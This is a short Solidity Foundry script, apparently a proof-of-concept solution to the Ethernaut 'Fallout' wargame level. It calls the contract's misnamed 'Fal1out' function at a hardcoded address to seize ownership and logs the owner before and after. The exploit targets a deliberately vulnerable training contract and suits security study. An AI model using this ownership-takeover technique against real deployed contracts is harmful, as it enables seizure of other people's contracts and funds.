//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/2_Fallout.sol";

contract POC is Script {
    Fallout public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Fallout(0x69c0d6fb4EBEe0CE3a9a6e5dEF6ac616D07691Ac);
        address owner = target.owner();
        console.log("before owner: ", owner);

        target.Fal1out();

        owner = target.owner();
        console.log("after  owner: ", owner);
        vm.stopBroadcast();
    }
}